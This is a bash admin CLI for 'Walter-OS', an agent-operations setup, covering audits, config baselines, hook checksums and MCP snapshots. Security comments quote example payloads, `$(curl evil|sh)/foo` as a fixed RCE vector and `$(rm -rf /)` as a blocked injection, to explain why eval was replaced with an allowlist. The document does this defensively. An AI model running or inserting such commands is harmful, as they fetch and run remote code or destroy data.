#!/usr/bin/env bash
# walter-os — CLI for Walter-OS operations (audit, baseline, profile,
#             secrets, agents, wiki, content, doctor — admin layer).
#
# This is the ADMIN binary. There is ALSO `bin/walter` (no `-os` suffix),
# which is the operator's DAILY-DRIVER CLI (new project / ask / pivot /
# deploy / etc.). The two are intentionally separate — don't merge them
# without coordinating the CLI surface for both.
#
# Quick map (issue #121):
#   walter-os  → audit / baseline / profile / lower-level ops
#   walter     → new project / ask / pivot / deploy / higher-level
#
# Both have a `doctor` subcommand:
#   walter-os doctor       checks the agent contract + symlinks
#   walter doctor          operator's install-health check (with --client-only)
#
# Subcommands:
#   audit                       Run supply-chain audit now (foreground)
#   status [--models]           Show audit + spend status, or model routing
#   audit verify-chain [date]   Verify tamper-evident audit hash chain
#   ack <id> [--reason]         Acknowledge a finding so it stops blocking
#   baseline <config>           Update baseline for a config file
#   baseline-hooks              Refresh hook checksums after intentional change
#   baseline-external-hooks     Refresh external/**/hooks/scripts/*.sh checksums
#                               after an intentional submodule SHA bump (audit P1-07)
#   enable-hook <name>          Enable a hook in ~/.claude/settings.json
#   disable-hook <name>         Disable a hook (without uninstalling)
#   sync                        Pull + reinstall walter-os itself
#   upgrade                     Upgrade local checkout and/or Walter-VM services
#   sync-repos                  Pull configured personal/work repos
#   profile {default|high-risk} Switch MCP profile (settings.json swap)
#   profile-bootstrap {init|status|sync-shared} [claude|codex|all]
#                               Set up multi-account profile dirs (work + personal)
#   onboard {device|teammate} --dry-run
#                               Print second-device or teammate onboarding checklist
#   secrets-identity-init       Bootstrap Infisical identity into an OS credential store
#   secrets-keychain-init       DEPRECATED alias for secrets-identity-init
#   secrets-status              Report current secrets session (age, expiry)
#   secrets-clear               Clear session marker, force re-auth on next load
#   secrets-pull [--list]       DEPRECATED — use `walter_secrets_load` shell fn instead
#   secrets-bootstrap [--force] DEPRECATED — Bitwarden retired for walter-os
#   syncthing-bootstrap         Register all expected folders on the VM hub
#   agent-memory {setup|status} Wire ~/.claude memory dirs into Syncthing folder
#   wiki {status|lint|ingest|query|commit}
#                               LLM-maintained knowledge base ops (Karpathy pattern)
#   spend report [--by-agent|--by-task] [--last <N>d]
#                               LiteLLM cost attribution report by agent or task
#   mode consensus {on|off|status} [--threshold N]
#                               Walter Council consensus mode toggle
#   agents {list|run-once|pause|resume|status}
#                               Walter Council (multi-agent autonomy ops)
#   lessons {list|query|rate|stats}
#                               Cross-agent learning broker (lessons.db)
#   new project <type> <name> [opts]
#                               Start project induction interview (generates charter + AGENTS.md + Plane epic)
#                               Types: webapp | service | solana | hackathon | personal
#   bridge {install|status} [args]
#                               Route CLI tools through Walter-Bridge (LiteLLM)
#                               install {claude-code-router|gemini-cli|codex-cli|all}
#                               status — check which CLIs are wired
#   content {stats|analyst|prereqs} [opts]
#                               DevRel analytics (Phase V) — content stats, analyst queries
#   analyst <query> [opts]      Shorthand for: walter-os content analyst <query>
#   pr-title <TYPE> <CATEGORY> <text>
#                               Generate a valid [TYPE] -CATEGORY- title string
#                               TYPE: FEAT/FIX/DOCS/CHORE/TEST  CATEGORY: SECURITY/BUSINESS/etc.
#   pr-score [PR] [--json]      Score PR readiness from checks, reviews, risk, and issue links
#   repo-config {validate|defaults}
#                               Validate walter-repo-config.yaml per-repo policy
#   overlay                     Open ~/.config/walter-os/overlay with configured opener
#   egress {add|remove|list|test|import}
#                               Manage network egress allowlist (#122 A-2)
#                               See docs/operational/network-egress.md
#   session {status|restart}    Manage time-bounded session state (#122 A-4)
#   cap {mint|list|verify|revoke}
#                               Manage session capability tokens (#122 A-2)
#   version                     Show current version + optional update check
#   doctor                      Diagnose install state
#   doctor --codex-startup      Diagnose Codex skill/plugin/MCP startup health
#   help                        Show this help

set -euo pipefail

# ---------- env ----------

# Export WALTER_CONFIG so subprocesses (audit.sh, hook scripts) resolve
# the same baseline files we do. Closes Codex R2 #129: cmd_audit was
# `exec audit.sh` without exporting WALTER_CONFIG, so an operator who
# set `WALTER_CONFIG=/custom/...` in personal.env saw bin/walter-os
# write baselines to /custom/... while audit.sh read from the default
# $HOME/.config/walter-os — drift detection silently checked the wrong
# file.
export WALTER_CONFIG="${WALTER_CONFIG:-${HOME}/.config/walter-os}"

# Load operator personal config from overlay (out-of-repo, persistent across checkouts).
# Sourced before the per-install env so that the per-install env can override overlay values.
_OVERLAY_PERSONAL_ENV="${HOME}/.config/walter-os/overlay/personal.env"
if [[ -f "$_OVERLAY_PERSONAL_ENV" ]]; then
  set +u
  # shellcheck source=/dev/null
  source "$_OVERLAY_PERSONAL_ENV"
  set -u
fi
unset _OVERLAY_PERSONAL_ENV

if [[ -f "${WALTER_CONFIG}/env" ]]; then
  # shellcheck source=/dev/null
  source "${WALTER_CONFIG}/env"
fi
# Default Walter-OS checkout location.
# Operators override via WALTER_OS_HOME env (in personal.env overlay or .env.local)
# or by symlinking ~/walter-os to their preferred location.
WALTER_OS_HOME="${WALTER_OS_HOME:-${HOME}/walter-os}"

if [[ ! -d "$WALTER_OS_HOME" ]]; then
  echo "walter-os: WALTER_OS_HOME does not exist: $WALTER_OS_HOME" >&2
  echo "  Run install.sh from the repo root, or export WALTER_OS_HOME in" >&2
  echo "  ~/.config/walter-os/overlay/personal.env" >&2
  exit 2
fi

CLAUDE_SETTINGS="${HOME}/.claude/settings.json"
ACK_FILE="${WALTER_CONFIG}/acks.json"
STATUS="${WALTER_CONFIG}/audit-status.json"
TODAY="$(date +%Y-%m-%d)"

mkdir -p "$WALTER_CONFIG"

# ---------- helpers ----------

require_jq() {
  if ! command -v jq >/dev/null 2>&1; then
    echo "walter-os: jq required for this command. Install: brew install jq" >&2
    exit 3
  fi
}

print_help() {
  # Print the file's leading-comment block (title + Subcommands list).
  # Stops at the first non-comment line (typically `set -euo pipefail`),
  # so adding new subcommands above never breaks the help output.
  awk '/^[^#]/ && NR > 1 { exit } /^#( |$)/ { sub(/^# ?/, ""); print }' "$0"
}

# ---------- audit ----------

cmd_audit() {
  case "${1:-}" in
    verify-chain)
      shift
      # shellcheck source=/dev/null
      source "${WALTER_OS_HOME}/scripts/walter/lib/audit-chain.sh"
      walter_audit_verify_chain "$@"
      return $?
      ;;
  esac
  exec "${WALTER_OS_HOME}/skills/daily-supply-chain-audit/scripts/audit.sh" "$@"
}

cmd_status() {
  if [[ "${1:-}" == "--models" ]]; then
    cmd_status_models
    return $?
  fi

  echo "Walter-OS status — ${TODAY}"
  echo
  echo "Repo: $WALTER_OS_HOME"
  echo "Config: $WALTER_CONFIG"
  echo
  if [[ -f "$STATUS" ]]; then
    require_jq
    local sev date crit high info
    sev="$(jq -r '.severity' "$STATUS")"
    date="$(jq -r '.date' "$STATUS")"
    crit="$(jq -r '.critical' "$STATUS")"
    high="$(jq -r '.high' "$STATUS")"
    info="$(jq -r '.info' "$STATUS")"
    case "$sev" in
      0) emoji="✅" label="clean" ;;
      1) emoji="ℹ️ " label="info-only" ;;
      2) emoji="⚠️ " label="HIGH findings" ;;
      3) emoji="🚨" label="CRITICAL findings" ;;
      *) emoji="?" label="unknown" ;;
    esac
    echo "Audit ${date}: ${emoji} ${label}"
    echo "  critical=${crit}  high=${high}  info=${info}"
    echo "  Report: ${WALTER_CONFIG}/audit-${date}.md"
  else
    echo "Audit: never run. Try: walter-os audit"
  fi

  if [[ -f "${WALTER_CONFIG}/spend-status.json" ]]; then
    echo
    echo "AI spend (today / month):"
    require_jq
    local today_spend month_spend budget
    today_spend="$(jq -r '.today_usd // 0' "${WALTER_CONFIG}/spend-status.json")"
    month_spend="$(jq -r '.this_month_usd // 0' "${WALTER_CONFIG}/spend-status.json")"
    budget="$(jq -r '.monthly_budget_usd // 0' "${WALTER_CONFIG}/spend-status.json")"
    echo "  today: \$${today_spend}"
    echo "  this month: \$${month_spend} / \$${budget} budget"
    # Budget warn: if month spend > budget and budget > 0, emit warning.
    if command -v awk >/dev/null 2>&1 && [[ -n "$budget" && "$budget" != "0" ]]; then
      if awk -v spend="$month_spend" -v budget="$budget" 'BEGIN{exit !(spend > budget)}'; then
        echo "  WARN: monthly LLM spend \$${month_spend} exceeds budget \$${budget}"
      fi
    fi
  fi

  # Council metrics section — reads from the Prometheus textfile metrics file.
  # Only shown when the file exists (skipped silently if no agent has run yet).
  local metrics_file="${WALTER_METRICS_FILE:-/var/lib/walter-council/metrics.prom}"
  if [[ -f "$metrics_file" ]]; then
    echo
    echo "Council (today):"
    # tasks_completed: sum of all success result counters
    local tasks_completed
    tasks_completed="$(grep -E '^walter_council_tasks_total\{.*result="success".*\}' "$metrics_file" 2>/dev/null \
      | awk '{sum += $NF} END {printf "%d", sum+0}' || echo 0)"
    # tasks_failed: sum of all non-success result counters
    local tasks_failed
    tasks_failed="$(grep -E '^walter_council_tasks_total\{.*result="(failed|needs_operator)".*\}' "$metrics_file" 2>/dev/null \
      | awk '{sum += $NF} END {printf "%d", sum+0}' || echo 0)"
    # tokens_total: sum of all token counters
    local tokens_total
    tokens_total="$(grep -E '^walter_council_tokens_total\{' "$metrics_file" 2>/dev/null \
      | awk '{sum += $NF} END {printf "%d", sum+0}' || echo 0)"
    # agents_working: count of agent_state = 1
    local agents_working
    agents_working="$(grep -E '^walter_council_agent_state\{' "$metrics_file" 2>/dev/null \
      | awk '$NF == 1 {count++} END {printf "%d", count+0}' || echo 0)"
    echo "  tasks_completed:  ${tasks_completed:-0}"
    echo "  tasks_failed:     ${tasks_failed:-0}"
    echo "  tokens_total:     ${tokens_total:-0}"
    echo "  agents_working:   ${agents_working:-0}"
  fi
}

cmd_status_models() {
  local router="${WALTER_OS_HOME}/scripts/walter/lib/model-router.sh"
  if [[ ! -f "$router" ]]; then
    echo "walter-os status --models: missing router at $router" >&2
    return 3
  fi

  # shellcheck source=/dev/null
  source "$router"

  echo "Model routing — ${TODAY}"
  echo
  echo "Effective routing:"
  walter_models_print_effective

  local metrics_file="${WALTER_METRICS_FILE:-/var/lib/walter-council/metrics.prom}"
  if [[ -f "$metrics_file" ]]; then
    echo
    echo "Council tokens by model:"
    awk '
      /^walter_council_tokens_total\{/ {
        model = "unknown"
        if (match($0, /model="[^"]+"/)) {
          model = substr($0, RSTART + 7, RLENGTH - 8)
        }
        totals[model] += $NF
      }
      END {
        for (model in totals) {
          printf "  %-20s %d\n", model ":", totals[model]
        }
      }
    ' "$metrics_file" | sort
  fi

  echo
  echo "Set WALTER_MODEL_* values in ~/.config/walter-os/overlay/personal.env."
}

# ---------- ack ----------

cmd_ack() {
  require_jq
  local id="${1:-}" reason=""
  shift || true
  while [[ $# -gt 0 ]]; do
    case "$1" in
      --reason) reason="${2:-}"; shift 2 ;;
      *) shift ;;
    esac
  done
  if [[ -z "$id" ]]; then
    echo "walter-os ack: finding id required" >&2
    echo "Usage: walter-os ack <id> [--reason '...']" >&2
    exit 2
  fi

  [[ -f "$ACK_FILE" ]] || echo '{"acks":[]}' > "$ACK_FILE"

  local expires_at
  expires_at="$(date -u -v+7d +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date -u -d '+7 days' +%Y-%m-%dT%H:%M:%SZ)"

  local entry
  entry="$(jq -n \
    --arg id "$id" \
    --arg reason "$reason" \
    --arg expires "$expires_at" \
    --arg ts "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
    '{id:$id, reason:$reason, expires_at:$expires, acked_at:$ts}')"

  jq --argjson entry "$entry" '.acks = ((.acks // []) | map(select(.id != $entry.id)) + [$entry])' \
    "$ACK_FILE" > "${ACK_FILE}.tmp"
  mv "${ACK_FILE}.tmp" "$ACK_FILE"

  echo "✓ Acknowledged '$id' until $expires_at"
  [[ -n "$reason" ]] && echo "  Reason: $reason"
}

# ---------- baseline ----------

cmd_baseline() {
  local cfg="${1:-}"
  if [[ -z "$cfg" ]]; then
    echo "walter-os baseline: config path required" >&2
    echo "Usage: walter-os baseline <path-to-config>" >&2
    exit 2
  fi
  if [[ ! -f "$cfg" ]]; then
    echo "walter-os baseline: file not found: $cfg" >&2
    exit 2
  fi

  local baselines_dir="${WALTER_CONFIG}/baselines"
  mkdir -p "$baselines_dir"
  local name; name="$(basename "$cfg")"
  local current; current="$(shasum -a 256 "$cfg" | awk '{print $1}')"
  echo "$current" > "${baselines_dir}/${name}.sha256"
  echo "✓ Baseline updated for $cfg"
  echo "  sha256: $current"
}

# _safe_expand_env_path — expand a literal `$VAR/...` or `${VAR}/...`
# token from an UNTRUSTED source (e.g. ~/.claude/settings.json hook
# command field) using ONLY the explicit allowlist below. Prints the
# resolved path to stdout on success (exit 0); returns 1 for any token
# that doesn't match a known prefix (which includes command-substitution
# attempts like `$(rm -rf /)` and `` `cmd` `` — those don't match the
# literal `$NAME/` patterns).
#
# NEVER replace this with eval. Closes Codex R2 (PR #124): the previous
# eval-based path executed arbitrary commands from settings.json when
# audit.sh check_hooks or walter-os baseline-hooks ran.
#
# Keep this in sync with the identical copy in
# skills/daily-supply-chain-audit/scripts/audit.sh.
_safe_expand_env_path() {
  local tok="$1"
  # shellcheck disable=SC2016 # single-quoted '$VAR/' is INTENTIONAL —
  # the case patterns must match the LITERAL `$NAME` text in $tok (which
  # came from settings.json). Expansion is what we're protecting against.
  case "$tok" in
    '$HOME'/*)              printf '%s' "${HOME}${tok#\$HOME}" ;;
    '${HOME}'/*)            printf '%s' "${HOME}${tok#'${HOME}'}" ;;
    '$WALTER_OS_HOME'/*)    [[ -n "${WALTER_OS_HOME:-}" ]] && printf '%s' "${WALTER_OS_HOME}${tok#\$WALTER_OS_HOME}" ;;
    '${WALTER_OS_HOME}'/*)  [[ -n "${WALTER_OS_HOME:-}" ]] && printf '%s' "${WALTER_OS_HOME}${tok#'${WALTER_OS_HOME}'}" ;;
    '$WALTER_CONFIG'/*)     [[ -n "${WALTER_CONFIG:-}" ]] && printf '%s' "${WALTER_CONFIG}${tok#\$WALTER_CONFIG}" ;;
    '${WALTER_CONFIG}'/*)   [[ -n "${WALTER_CONFIG:-}" ]] && printf '%s' "${WALTER_CONFIG}${tok#'${WALTER_CONFIG}'}" ;;
    *)                      return 1 ;;
  esac
}

# _hash_file — portable SHA256 of a file's content (GNU/BSD).
# Returns the 64-char hex hash, or empty string if the file is unreadable
# or no hasher is installed.
_hash_file() {
  local file="$1"
  [[ -r "$file" && -f "$file" ]] || { echo ""; return; }
  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$file" 2>/dev/null | awk '{print $1}'
  elif command -v shasum >/dev/null 2>&1; then
    shasum -a 256 "$file" 2>/dev/null | awk '{print $1}'
  else
    echo ""
  fi
}

# _hook_checksums_schema_version — detect existing baseline schema.
# Returns: "v1" (legacy array of command-strings), "v2" (typed object
# with .version=2), "missing" (no file), or "unknown" (corrupted).
# See ADR 0016 for the schema migration design.
_hook_checksums_schema_version() {
  local file="${WALTER_CONFIG}/hook-checksums.json"
  [[ -f "$file" ]] || { echo "missing"; return; }
  if jq -e 'type == "object" and .version == 2' "$file" >/dev/null 2>&1; then
    echo "v2"
  elif jq -e 'type == "array"' "$file" >/dev/null 2>&1; then
    echo "v1"
  else
    echo "unknown"
  fi
}

cmd_baseline_hooks() {
  require_jq
  local settings="$CLAUDE_SETTINGS"
  if [[ ! -f "$settings" ]]; then
    echo "walter-os baseline-hooks: $settings not found" >&2
    exit 2
  fi
  local checksums="${WALTER_CONFIG}/hook-checksums.json"

  local prev_schema; prev_schema=$(_hook_checksums_schema_version)
  case "$prev_schema" in
    v1) echo "info: migrating hook-checksums.json from v1 (string array) to v2 (typed object with content sha256)" ;;
    unknown) echo "warning: existing hook-checksums.json schema not recognized; overwriting with v2" ;;
  esac

  # Extract every {command:...} hook entry from settings.json
  local hooks_array
  hooks_array=$(jq '[.hooks // {} | .. | objects | select(has("command"))]' "$settings")

  # Build v2 entries: {command, path, sha256} per hook.
  # path = first whitespace-separated token of command (the executable).
  local result
  result=$(jq -n '{version: 2, hooks: []}')

  local n; n=$(jq 'length' <<<"$hooks_array")
  local i=0
  while [[ $i -lt $n ]]; do
    local cmd; cmd=$(jq -r ".[$i].command" <<<"$hooks_array")
    # Resolve path: ONLY treat the first token as a file path if it
    # LOOKS like one (starts with /, ./, ~/, or a $ env-var). Anything
    # else (echo, /bin/sh -c "...", inline expressions) is treated as
    # an inline command — path="" → audit skips content check + does
    # not emit "hook-file-missing". Copilot R1 #124 R1.1.
    local first_tok; first_tok=$(awk '{print $1}' <<<"$cmd")
    local path=""
    case "$first_tok" in
      /*|./*|../*)
        [[ -f "$first_tok" ]] && path="$first_tok"
        ;;
      ~/*)
        local resolved="${first_tok/#\~/$HOME}"
        [[ -f "$resolved" ]] && path="$resolved"
        ;;
      \$*)
        # Env-var-prefixed path. Use the explicit allowlist in
        # _safe_expand_env_path — NEVER eval. Closes Codex R2 (PR #124):
        # eval on a token sourced from settings.json was an RCE vector
        # (an attacker who could tamper with ~/.claude/settings.json
        # could put `$(curl evil|sh)/foo` in a hook command field).
        # The helper is defined below; keep it byte-identical with the
        # copy in skills/daily-supply-chain-audit/scripts/audit.sh.
        local resolved=""
        if resolved="$(_safe_expand_env_path "$first_tok")"; then
          [[ -n "$resolved" && -f "$resolved" ]] && path="$resolved"
        fi
        ;;
    esac
    local sha=""
    [[ -n "$path" ]] && sha=$(_hash_file "$path")
    result=$(jq --arg c "$cmd" --arg p "$path" --arg s "$sha" \
      '.hooks += [{command: $c, path: $p, sha256: $s}]' <<<"$result")
    i=$((i + 1))
  done

  # Atomic write + deterministic sort
  mkdir -p "$(dirname "$checksums")"
  echo "$result" | jq --sort-keys '.' > "${checksums}.tmp" && mv "${checksums}.tmp" "$checksums"
  echo "✓ Hook checksums refreshed (v2 schema, $n entries): $checksums"
}

# Re-snapshot mcp/servers.json after an intentional MCP server change
# (added / removed / version bump / trust-level change). Operators run
# this only after reviewing the change. Closes #117 Phase 1.
# Phase 2 (per-tool schema query via stdio JSON-RPC) is a follow-up.
cmd_baseline_mcp_tools() {
  require_jq
  local registry="${WALTER_OS_HOME:-${HOME}/walter-os}/mcp/servers.json"
  if [[ ! -f "$registry" ]]; then
    echo "walter-os baseline-mcp-tools: registry not found at $registry" >&2
    exit 2
  fi
  local baseline="${WALTER_CONFIG}/mcp-server-snapshots.json"
  mkdir -p "$(dirname "$baseline")"
  # Codex R3 #129: symmetric fix to audit.sh's mktemp baseline write —
  # concurrent runs of `walter-os baseline-mcp-tools` (or this command +
  # check_tool_definitions first-run) would share `${baseline}.tmp` and
  # could clobber. Use a unique per-process tmp file in the same dir
  # so the final mv stays atomic on the same filesystem.
  local tmp; tmp="$(mktemp "${baseline}.tmp.XXXXXX")"
  jq --sort-keys '.servers // {}' "$registry" > "$tmp" && mv "$tmp" "$baseline"
  local n
  n="$(jq 'length' "$baseline")"
  echo "✓ MCP server snapshot refreshed ($n servers): $baseline"
}

# Re-snapshot external/**/hooks/scripts/*.{sh,py,js} after an intentional
# submodule bump (audit P1-07). Operators should run this only after
# reviewing the diff in the submodule.
cmd_baseline_external_hooks() {
  [[ -n "${WALTER_OS_HOME:-}" && -d "${WALTER_OS_HOME}/external" ]] || {
    echo "walter-os baseline-external-hooks: WALTER_OS_HOME/external not found" >&2
    exit 2
  }
  local -a hasher_cmd=()
  if command -v sha256sum >/dev/null 2>&1; then
    hasher_cmd=(sha256sum)
  elif command -v shasum >/dev/null 2>&1; then
    hasher_cmd=(shasum -a 256)
  else
    echo "walter-os baseline-external-hooks: install sha256sum or shasum" >&2
    exit 3
  fi
  require_jq
  local baseline="${WALTER_CONFIG}/external-hook-checksums.json"

  # Mirror the hardening applied to audit.sh check_external_hooks
  # (Copilot review of PR #90):
  # - --no-run-if-empty on GNU xargs (with a BSD fallback) so an empty
  #   match set doesn't make the hasher read stdin and emit a synthetic
  #   "<hash>  -" baseline entry.
  # - Robust regex parse of the hasher output (the previous
  #   split("  ") was sensitive to delimiter width and broke on paths
  #   containing double spaces).
  # - --sort-keys for deterministic baseline JSON regardless of jq
  #   version or object-insertion order.
  local -a xargs_cmd=(xargs -0)
  if printf '' | xargs --no-run-if-empty -0 true 2>/dev/null; then
    xargs_cmd+=(--no-run-if-empty)
  else
    # BSD xargs path (macOS): pre-check whether there's at least one match.
    local first_file
    first_file="$(find "${WALTER_OS_HOME}/external" \
      -type f \
      -path '*/hooks/scripts/*' \
      \( -name '*.sh' -o -name '*.py' -o -name '*.js' \) \
      -print 2>/dev/null \
      | head -1)"
    if [[ -z "$first_file" ]]; then
      # No external hook scripts → write an empty-object baseline.
      printf '{}\n' > "$baseline"
      echo "walter-os baseline-external-hooks: no external hook scripts found; wrote empty baseline at $baseline"
      return 0
    fi
  fi

  find "${WALTER_OS_HOME}/external" \
    -type f \
    -path '*/hooks/scripts/*' \
    \( -name '*.sh' -o -name '*.py' -o -name '*.js' \) \
    -print0 2>/dev/null \
    | LC_ALL=C sort -z \
    | "${xargs_cmd[@]}" "${hasher_cmd[@]}" 2>/dev/null \
    | jq -R --slurp --sort-keys '
        split("\n")
        | map(select(length > 0))
        | map(capture("^(?<hash>[0-9a-f]{64})[[:space:]]+\\*?(?<path>.+)$"))
        | map({(.path | sub("^.*/external/"; "external/")): .hash})
        | add // {}
      ' \
    > "$baseline"
  echo "✓ External hook checksums refreshed: $baseline"
}

